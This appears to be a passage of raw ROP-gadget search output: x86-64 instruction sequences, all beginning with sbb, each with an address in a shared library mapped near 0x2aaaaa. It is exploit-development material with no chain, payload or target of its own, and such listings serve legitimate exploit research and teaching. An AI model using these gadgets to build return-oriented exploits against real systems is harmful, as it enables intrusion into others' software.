0x00002aaaaac27d57 : sbb byte ptr [rax + rax], al ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac5d0bc : sbb byte ptr [rax - 0x437d000d], dh ; jmp qword ptr [rbx]
0x00002aaaaab7acb3 : sbb byte ptr [rax - 0x73], cl ; jg 0xa5cdb ; jne 0xa628b ; ret
0x00002aaaaab7c3f7 : sbb byte ptr [rax - 0x73], cl ; jg 0xa741f ; jne 0xa7a9b ; ret
0x00002aaaaab9d702 : sbb byte ptr [rax - 0x75], cl ; and al, 0x10 ; call rax
0x00002aaaaaaf9368 : sbb byte ptr [rax - 0x75], cl ; and al, 0x28 ; call rax
0x00002aaaaaaf9d03 : sbb byte ptr [rax - 0x75], cl ; and al, 0x30 ; call rax
0x00002aaaaabb1a1a : sbb byte ptr [rax - 0x75], cl ; cmp ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaaaff834 : sbb byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; ret
0x00002aaaaabe30f2 : sbb byte ptr [rax - 0x77], cl ; imul ebx, dword ptr [rax], 0x48 ; add esp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab50161 : sbb byte ptr [rax - 0x77], cl ; push rdi ; mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaabc87b7 : sbb byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabc445a : sbb byte ptr [rax - 0x77], cl ; ret 0x33eb
0x00002aaaaab5d626 : sbb byte ptr [rax - 0x77], cl ; ret 0x348
0x00002aaaaab48f31 : sbb byte ptr [rax - 0x77], cl ; sub byte ptr [rax - 0x77], cl ; ret 0x9e9
0x00002aaaaab8670a : sbb byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x84 ; ret
0x00002aaaaab4db09 : sbb byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax + 0xf] ; ret 0x8d48
0x00002aaaaab68d56 : sbb byte ptr [rax - 0x7d], cl ; out dx, al ; adc byte ptr [rax - 0x75], cl ; sbb byte ptr [rax - 0x7d], r9b ; ret 0x4802
0x00002aaaaab9dfe3 : sbb byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabcd4e6 : sbb byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaab68d5e : sbb byte ptr [rax - 0x7d], cl ; ret 0x4802
0x00002aaaaab587d7 : sbb byte ptr [rax - 0x7d], cl ; ret 0x4810
0x00002aaaaab68d5d : sbb byte ptr [rax - 0x7d], r9b ; ret 0x4802
0x00002aaaaab9f2b9 : sbb byte ptr [rax - 1], bh ; pop rbx ; pop rbp ; ret
0x00002aaaaab5287f : sbb byte ptr [rax - 9], cl ; fisttp dword ptr [rax + 0x21] ; ret
0x00002aaaaac90ac7 : sbb byte ptr [rax], al ; add al, ah ; or ch, byte ptr [rsi] ; ret 0xb
0x00002aaaaac90b1f : sbb byte ptr [rax], al ; add al, ah ; or dword ptr [rsi], ebp ; ret 0xa
0x00002aaaaab509af : sbb byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaac105d7 : sbb byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rbx - 0xd], bl ; ret
0x00002aaaaab39134 : sbb byte ptr [rax], al ; add dh, dh ; ret
0x00002aaaaab4c3e6 : sbb byte ptr [rax], al ; setne al ; ret
0x00002aaaaaad745c : sbb byte ptr [rax], cl ; ret 0x5576
0x00002aaaaab7e2b5 : sbb byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 0x19], ch ; ret
0x00002aaaaab7e2d7 : sbb byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 0x1a], ch ; ret
0x00002aaaaab7e315 : sbb byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi + 0x1c], ch ; ret
0x00002aaaaac12d68 : sbb byte ptr [rbp + 0x39], cl ; ret
0x00002aaaaab4c757 : sbb byte ptr [rbp + rcx*4 + 0x1c], cl ; add ecx, dword ptr [rax - 9] ; fmul dword ptr [rcx + 0x21] ; ret
0x00002aaaaac00c0a : sbb byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x2c ; call qword ptr [rax]
0x00002aaaaac0c271 : sbb byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x3a ; call qword ptr [rax]
0x00002aaaaaaf6859 : sbb byte ptr [rbp - 0x77], cl ; int1 ; call rbx
0x00002aaaaac84c08 : sbb byte ptr [rbp - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac7dd68 : sbb byte ptr [rbp - 0xf], bl ; jmp qword ptr [rcx]
0x00002aaaaab07854 : sbb byte ptr [rbx + 0x29480005], al ; ret
0x00002aaaaabcb292 : sbb byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaaaf6110 : sbb byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab4bb04 : sbb byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab7389d : sbb byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaab4bba7 : sbb byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaac00f14 : sbb byte ptr [rbx + 0x5d], bl ; pop r13 ; pop r14 ; ret
0x00002aaaaab10177 : sbb byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaac021af : sbb byte ptr [rbx + 0xb7603f8], al ; mov eax, 2 ; ret
0x00002aaaaab51887 : sbb byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x00002aaaaac02c43 : sbb byte ptr [rbx - 0x73fa17c5], cl ; std ; dec dword ptr [rax - 0x77] ; ret 0xffb8
0x00002aaaaac6934c : sbb byte ptr [rbx - 5], 0xff ; and byte ptr [rbx - 5], dh ; jmp qword ptr [rax + 0x20fffb74]
0x00002aaaaac83918 : sbb byte ptr [rbx], al ; cmc ; call qword ptr [rdi]
0x00002aaaaab72faf : sbb byte ptr [rcx + 0x39], al ; rol byte ptr [rcx + 0xf], 1 ; xchg eax, ebp ; ret 0x3941
0x00002aaaaab56c51 : sbb byte ptr [rcx + 0x39], cl ; ret 0x850f
0x00002aaaaab47bdb : sbb byte ptr [rcx + 0x5bc0310b], cl ; ret
0x00002aaaaac113dc : sbb byte ptr [rcx + 0x63], cl ; ret
0x00002aaaaabc052e : sbb byte ptr [rcx + 0xf], al ; mov dh, 0x75 ; add dh, dh ; ret 0x4002
0x00002aaaaab56146 : sbb byte ptr [rcx + rcx*4 + 0x44], cl ; and al, 0x10 ; call rdi
0x00002aaaaaba3346 : sbb byte ptr [rcx + rcx*4 + 0x78], cl ; or byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab81800 : sbb byte ptr [rcx + rcx*4 - 0x16], cl ; mov rdi, rbp ; call rbx
0x00002aaaaab81ab8 : sbb byte ptr [rcx + rcx*4 - 0x17], cl ; mov rdi, rbp ; call rbx
0x00002aaaaab0d382 : sbb byte ptr [rcx + rcx*4 - 0x19], cl ; call r15
0x00002aaaaab4a0c3 : sbb byte ptr [rcx + rcx*4 - 0x19], cl ; call rbx
0x00002aaaaab81d68 : sbb byte ptr [rcx + rcx*4 - 0x19], cl ; mov r9, r15 ; call rbx
0x00002aaaaab4c9c5 : sbb byte ptr [rcx + rcx*4 - 0x20], cl ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab5763b : sbb byte ptr [rcx + rcx*4 - 0x40], cl ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab574c3 : sbb byte ptr [rcx + rcx*4 - 0x40], cl ; pop rbx ; ret
0x00002aaaaac71fb8 : sbb byte ptr [rcx - 0x17], ah ; jmp rdx
0x00002aaaaabe8723 : sbb byte ptr [rcx - 0x76b37fab], cl ; call rax
0x00002aaaaab72d4e : sbb byte ptr [rcx - 0x76b703b9], cl ; clc ; ret
0x00002aaaaab494d3 : sbb byte ptr [rcx - 0x77], cl ; ret 0x8b49
0x00002aaaaab491db : sbb byte ptr [rcx - 0x77], cl ; sub byte ptr [r8 + 1], r9b ; ret 0x8949
0x00002aaaaabe2b9e : sbb byte ptr [rcx - 0x7d], cl ; call 0xffffffffff9623b1
0x00002aaaaab8dfac : sbb byte ptr [rcx - 0x7d], cl ; ret
0x00002aaaaab80b71 : sbb byte ptr [rcx - 0x7d], cl ; ret 0x4908
0x00002aaaaac6c8dd : sbb byte ptr [rcx], al ; add ah, dh ; int1 ; call rsp
0x00002aaaaabc4454 : sbb byte ptr [rcx], al ; mov rax, qword ptr [rsp + 0x18] ; mov rdx, rax ; jmp 0xef49c
0x00002aaaaabd0fe1 : sbb byte ptr [rcx], al ; ret 0x8d48
0x00002aaaaaba9382 : sbb byte ptr [rcx], bh ; ret 0x850f
0x00002aaaaab4a117 : sbb byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; ret
0x00002aaaaabebd28 : sbb byte ptr [rcx], dh ; ror byte ptr [rax - 9], cl ; pop rbx ; pop rbp ; ret
0x00002aaaaab4cc87 : sbb byte ptr [rdi + 0xe], dh ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac6a9bc : sbb byte ptr [rdi - 0x60ff0004], 0xfc ; push qword ptr [rax - 0x62] ; cld ; jmp rax
0x00002aaaaab40318 : sbb byte ptr [rdi], cl ; mov dh, 0xc0 ; neg eax ; ret
0x00002aaaaac0ef98 : sbb byte ptr [rdi], cl ; mov dh, 0xc0 ; pop rbx ; pop rbp ; ret
0x00002aaaaac1076e : sbb byte ptr [rdi], cl ; mov dh, 0xc0 ; ret
0x00002aaaaabe303e : sbb byte ptr [rdi], cl ; mov esi, 0xc48348c3 ; or byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab08e52 : sbb byte ptr [rdi], cl ; scasd eax, dword ptr [rdi] ; ret 0xd231
0x00002aaaaac02768 : sbb byte ptr [rdi], cl ; test bh, cl ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x894c
0x00002aaaaac87188 : sbb byte ptr [rdi], dl ; cld ; jmp qword ptr [rsi]
0x00002aaaaac7f518 : sbb byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaaad7057 : sbb byte ptr [rdx - 0x1a], dl ; ret
0x00002aaaaac5d62c : sbb byte ptr [rdx - 0xc], dl ; jmp qword ptr [rdx]
0x00002aaaaac69af8 : sbb byte ptr [rip + 0x1ed0fffc], 0xfc ; jmp qword ptr [rax]
0x00002aaaaac5dddc : sbb byte ptr [rip + 0x518fff5], al ; cmc ; call rax
0x00002aaaaac5dde8 : sbb byte ptr [rip + 0x518fff5], al ; cmc ; jmp rax
0x00002aaaaac5de60 : sbb byte ptr [rip + 0x580fff5], al ; cmc ; call rax
0x00002aaaaabed82c : sbb byte ptr [rip + 0xffffff], ah ; or eax, edi ; bswap eax ; ret
0x00002aaaaac76b38 : sbb byte ptr [rsi + 0x200e4103], al ; add dword ptr [rax + rbp*2], 0xa ; ret
0x00002aaaaac788f8 : sbb byte ptr [rsi + 0x200e4103], al ; add dword ptr [rsi], 0xa ; ret
0x00002aaaaac804f0 : sbb byte ptr [rsi + 0x200e4303], al ; add dword ptr [rax + rsi*2], 0xa ; ret
0x00002aaaaac78448 : sbb byte ptr [rsi + 0x200e4403], al ; add dword ptr [rdx + rax], -0xc ; ret
0x00002aaaaac84298 : sbb byte ptr [rsi + 0x200e4403], al ; add dword ptr [rsp + rbp*2], 0xa ; ret
0x00002aaaaabddde2 : sbb byte ptr [rsi - 0x7d], ah ; add byte ptr [rcx], al ; ret
0x00002aaaaabddde1 : sbb byte ptr [rsi - 0x7d], spl ; add byte ptr [rcx], al ; ret
0x00002aaaaac69290 : sbb byte ptr [rsi], 0xfb ; jmp qword ptr [rax]
0x00002aaaaab7a937 : sbb byte ptr [rsi], cl ; add byte ptr [rbx + 0x63], cl ; or al, 0x83 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaabd3ce4 : sbb byte ptr [rsp + rbp], dh ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac69b88 : sbb byte ptr [rsp + rdi*8 - 1], 0x10 ; pop rsp ; cld ; jmp qword ptr [rsi + 0x16fffc5b]
0x00002aaaaaba937f : sbb cl, al ; clc ; sbb byte ptr [rcx], bh ; ret 0x850f
0x00002aaaaac86ec9 : sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaab7ad0b : sbb cl, byte ptr [rax - 0x73] ; jg 0xa5d35 ; jne 0xa628b ; ret
0x00002aaaaab7c45f : sbb cl, byte ptr [rax - 0x73] ; jg 0xa7489 ; jne 0xa7a9b ; ret
0x00002aaaaabca9de : sbb cl, byte ptr [rax - 0x77] ; ret 0x8948
0x00002aaaaabfd833 : sbb cl, byte ptr [rax - 0x7d] ; ret 0xf01
0x00002aaaaabe4d0d : sbb cl, byte ptr [rcx - 0x75] ; and byte ptr [r8 + 0x39], r9b ; ret
0x00002aaaaaaf8ac7 : sbb cl, byte ptr [rdi] ; mov esi, 0x48891b52 ; push rax ; mov dword ptr [rax + 0x54], edx ; ret
0x00002aaaaab7ad0f : sbb cl, byte ptr [rdi] ; test dword ptr [rdx + 5], ebp ; add byte ptr [rax], al ; ret
0x00002aaaaac19c5d : sbb cl, byte ptr [rdi] ; xchg ah, bl ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1bdcd : sbb cl, byte ptr [rdi] ; xchg ah, bl ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1984d : sbb cl, byte ptr [rdi] ; xchg ah, ch ; add eax, 0x83480000 ; ret 0xeb10
0x00002aaaaac19359 : sbb cl, byte ptr [rdi] ; xchg al, ah ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac19b69 : sbb cl, byte ptr [rdi] ; xchg al, dl ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1fd7a : sbb cl, byte ptr [rdi] ; xchg bh, bh ; add eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1f59a : sbb cl, byte ptr [rdi] ; xchg bh, bl ; or eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1f98a : sbb cl, byte ptr [rdi] ; xchg bh, ch ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1f1aa : sbb cl, byte ptr [rdi] ; xchg bh, cl ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c92d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax + rax], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1c10d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax + rcx - 0x7cb80000], bl ; ret 0xe910
0x00002aaaaac195dd : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax + rcx], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1b8ed : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax + rdx - 0x7cb80000], bh ; ret 0xe910
0x00002aaaaac1991d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax - 0x7cb80000], bl ; ret 0xeb10
0x00002aaaaac19c39 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax], al ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1f349 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax], dh ; adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac19d09 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax], dh ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c44d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbp + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1bc2d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbp + rcx], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1b40d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbp + rdx - 0x7cb80000], bl ; ret 0xe910
0x00002aaaaac1c5ed : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbx + rax - 0x7cb80000], bh ; ret 0xe910
0x00002aaaaac19abd : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbx + rax], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac192ad : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbx + rcx - 0x7cb80000], cl ; ret 0xeb10
0x00002aaaaac196ad : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdi + rax - 0x7cb80000], cl ; ret 0xeb10
0x00002aaaaac1f83a : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdi], bh ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1f05a : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdi], bl ; adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac2016a : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdi], cl ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac19b8d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdx + rax - 0x7cb80000], ch ; ret 0xeb10
0x00002aaaaac1937d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdx + rcx - 0x7cb80000], bh ; ret 0xeb10
0x00002aaaaac1b74d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdx + rdx], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1941f : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdx], bl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1977d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi + rax - 0x7cb80000], bh ; ret 0xeb10
0x00002aaaaac1b883 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], ah ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c583 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], ah ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c0a3 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], al ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1f73b : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], bh ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac2006b : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], cl ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac199ed : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsp + rax], cl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1c8c3 : sbb cl, byte ptr [rdi] ; xchg dh, ah ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1bbc3 : sbb cl, byte ptr [rdi] ; xchg dh, ah ; or eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1b6e3 : sbb cl, byte ptr [rdi] ; xchg dh, al ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c3e3 : sbb cl, byte ptr [rdi] ; xchg dh, al ; add eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1f88b : sbb cl, byte ptr [rdi] ; xchg dh, ch ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1f0ab : sbb cl, byte ptr [rdi] ; xchg dh, cl ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac19443 : sbb cl, byte ptr [rdi] ; xchg dh, dh ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaab7a74b : sbb cl, byte ptr [rsi] ; add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaac6e049 : sbb dh, bh ; call rsp
0x00002aaaaabe44f3 : sbb dh, dh ; ret 0x7508
0x00002aaaaac81250 : sbb dl, 0xf3 ; jmp qword ptr [rcx]
0x00002aaaaac75768 : sbb dl, cl ; in al, dx ; jmp rax
0x00002aaaaac1d088 : sbb dword ptr [r8], r8d ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaab92e72 : sbb dword ptr [rax + 0x48000000], -0x77 ; fmul dword ptr [rax - 0x7d] ; ret
0x00002aaaaaba9d93 : sbb dword ptr [rax + 1], edi ; ret
0x00002aaaaac27c7d : sbb dword ptr [rax + rax], eax ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab7acd6 : sbb dword ptr [rax - 0x73], ecx ; jg 0xa5cff ; jne 0xa628b ; ret
0x00002aaaaab7c42a : sbb dword ptr [rax - 0x73], ecx ; jg 0xa7453 ; jne 0xa7a9b ; ret
0x00002aaaaab03514 : sbb dword ptr [rax - 0x77], ecx ; ret
0x00002aaaaabda1f6 : sbb dword ptr [rax - 0x77], ecx ; ret 0xf66
0x00002aaaaac147c4 : sbb dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaac1d011 : sbb dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1d089 : sbb dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaaba1e25 : sbb dword ptr [rbp + rsi*2 - 0x7e], edx ; mov eax, 0x7d00 ; ret
0x00002aaaaab6b2d3 : sbb dword ptr [rbp - 0x76b70008], edx ; ret 0x8949
0x00002aaaaabf7cb8 : sbb dword ptr [rbx + 0x7ba14fe], eax ; add dword ptr [rax], eax ; add byte ptr [rdi], cl ; ret 0xfc3
0x00002aaaaab7f17e : sbb dword ptr [rbx + 0xc7402f8], eax ; xor eax, eax ; ret
0x00002aaaaabea683 : sbb dword ptr [rbx + rax], edi ; ret
0x00002aaaaac596fd : sbb dword ptr [rbx], edx ; mov ch, 0x99 ; in eax, -1 ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x00002aaaaabf830a : sbb dword ptr [rcx + 0xf], eax ; mov dh, 0x52 ; add dword ptr [rcx - 0x7d], ecx ; ret 0x4102
0x00002aaaaac0b581 : sbb dword ptr [rcx], ebp ; add byte ptr [rbp + 0xa], dh ; jmp 0x1365b3
0x00002aaaaab7c42e : sbb dword ptr [rdi], ecx ; test dword ptr [rbx + 6], ebx ; add byte ptr [rax], al ; ret
0x00002aaaaaad6cb7 : sbb dword ptr [rdx + 0x55], esp ; je 0x1ce9 ; ret
0x00002aaaaaafbb0c : sbb dword ptr [rip - 0x72b80000], eax ; add cl, byte ptr [rax + 0x39] ; ret
0x00002aaaaab7a8a7 : sbb dword ptr [rsi], ecx ; add byte ptr [rbx + 0x63], cl ; or al, 0x83 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaab7a874 : sbb dword ptr [rsi], ecx ; add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaac5d51c : sbb eax, -0xd ; jmp rax
0x00002aaaaac4101c : sbb eax, -1 ; ret
0x00002aaaaab79b1d : sbb eax, -1 ; xor cl, cl ; mov byte ptr [rax], cl ; mov rax, rdi ; ret
0x00002aaaaabe9f74 : sbb eax, 0 ; leave ; ret
0x00002aaaaab1c062 : sbb eax, 0x146ad7 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab7ad95 : sbb eax, 0x1d7f8d48 ; jne 0xa628b ; ret
0x00002aaaaab7c4e9 : sbb eax, 0x1d7f8d48 ; jne 0xa7a9b ; ret
0x00002aaaaac69af9 : sbb eax, 0x1ed0fffc ; cld ; jmp qword ptr [rax]
0x00002aaaaac69b39 : sbb eax, 0x1f40fffc ; cld ; call qword ptr [rax - 0x1f0003e0]
0x00002aaaaac48730 : sbb eax, 0x25200b ; jne 0x173720 ; pop rbx ; ret
0x00002aaaaabdd971 : sbb eax, 0x2ba8ca ; pop rbx ; ret
0x00002aaaaac692cd : sbb eax, 0x3a40fffb ; sti ; jmp qword ptr [rax]
0x00002aaaaab7ad99 : sbb eax, 0x4e0850f ; add byte ptr [rax], al ; ret
0x00002aaaaabe7732 : sbb eax, 0x507a8b48 ; mov rsi, rdx ; call rax
0x00002aaaaab7c4ed : sbb eax, 0x59c850f ; add byte ptr [rax], al ; ret
0x00002aaaaac81c4d : sbb eax, 0x66b00001 ; stc ; call qword ptr [rax]
0x00002aaaaabda27a : sbb eax, 0x888bf ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaabe4ff5 : sbb eax, 0x89000001 ; ret 0x8944
0x00002aaaaab5602d : sbb eax, 0x894c0034 ; and al, 0x10 ; xor edi, edi ; call qword ptr [rax]
0x00002aaaaabfc02b : sbb eax, 0xf2cfb80 ; xchg eax, ebp ; ret 0xfb80
0x00002aaaaabfaada : sbb eax, 0xf48002a ; ret 0xff81
0x00002aaaaabfbc7a : sbb eax, dword ptr [rax - 0x6af0dc07] ; ret 0xf980
0x00002aaaaac1ce31 : sbb eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1cea9 : sbb eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac5871d : sbb eax, dword ptr [rdx + 0x2ff463c7] ; hlt ; stosb byte ptr [rdi], al ; cli ; ret 0xac65
0x00002aaaaac07470 : sbb eax, eax ; add rsp, 8 ; add eax, 2 ; ret
0x00002aaaaabab606 : sbb eax, eax ; and eax, 2 ; add eax, 8 ; ret
0x00002aaaaab1d46a : sbb eax, eax ; and eax, 2 ; sub eax, 1 ; ret
0x00002aaaaab93b3c : sbb eax, eax ; not eax ; add eax, 0x16e ; ret
0x00002aaaaabab650 : sbb eax, eax ; not eax ; and eax, 2 ; ret
0x00002aaaaabf78e8 : sbb eax, eax ; ret
0x00002aaaaac46725 : sbb eax, eax ; sbb eax, -1 ; ret
0x00002aaaaac0b3be : sbb ebp, dword ptr [rcx] ; add byte ptr [rax - 0x7f], cl ; in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret
0x00002aaaaac76ec9 : sbb ebp, ebp ; jmp qword ptr [rax]
0x00002aaaaabaa143 : sbb ebp, ecx ; ret
0x00002aaaaab8fef7 : sbb ebx, 0x89000001 ; ret
0x00002aaaaac69285 : sbb ebx, edi ; jmp rax
0x00002aaaaac69281 : sbb ebx, edi ; push rax ; sbb ebx, edi ; jmp rax
0x00002aaaaabd3385 : sbb ecx, dword ptr [rax + 0x39] ; ret
0x00002aaaaab7ad39 : sbb ecx, dword ptr [rax - 0x73] ; jg 0xa5d64 ; jne 0xa628b ; ret
0x00002aaaaab7c48d : sbb ecx, dword ptr [rax - 0x73] ; jg 0xa74b8 ; jne 0xa7a9b ; ret
0x00002aaaaab29d50 : sbb ecx, dword ptr [rax - 0x77] ; ret 0x6348
0x00002aaaaac010a1 : sbb ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaaaf8acb : sbb ecx, dword ptr [rcx + 0x50895048] ; push rsp ; ret
0x00002aaaaabf9d64 : sbb edi, dword ptr [rcx] ; ret
0x00002aaaaab42cda : sbb edi, ebx ; dec dword ptr [rax - 0x7b] ; sal byte ptr [rbx + rdi*2 + 0x48], 0x89 ; ret
0x00002aaaaac5d5cc : sbb edx, dword ptr [rcx - 0xc] ; jmp qword ptr [rdx]
0x00002aaaaab1eed1 : sbb edx, ebx ; mov qword ptr [rdi + 8], r10 ; mov eax, ecx ; adc eax, eax ; ret
0x00002aaaaac6f479 : sbb edx, edi ; jmp rsp
0x00002aaaaac7f1c9 : sbb edx, esi ; jmp qword ptr [rcx]
0x00002aaaaaad8af3 : sbb esi, dword ptr [rdx - 0x2f] ; clc ; cmp eax, ecx ; mov bl, 0xf7 ; adc bh, byte ptr [rax] ; cwde ; ret
0x00002aaaaaad75df : sbb esi, dword ptr [rdx] ; sahf ; jl 0x257a ; loop 0x25c5 ; ret 0x23cb
0x00002aaaaac6be11 : sbb esi, ebp ; call rsp
0x00002aaaaabe9cee : sbb esi, ebx ; ret
0x00002aaaaabb0a04 : sbb esi, esi ; ret
0x00002aaaaac69aed : sbb esp, edi ; jmp rax
0x00002aaaaab1eed0 : sbb r10, r11 ; mov qword ptr [rdi + 8], r10 ; mov eax, ecx ; adc eax, eax ; ret
0x00002aaaaac4101b : sbb rax, -1 ; ret
0x00002aaaaab79b1c : sbb rax, -1 ; xor cl, cl ; mov byte ptr [rax], cl ; mov rax, rdi ; ret
0x00002aaaaac69ae8 : sbb spl, dil ; call qword ptr [rax - 0x1f0003e7]
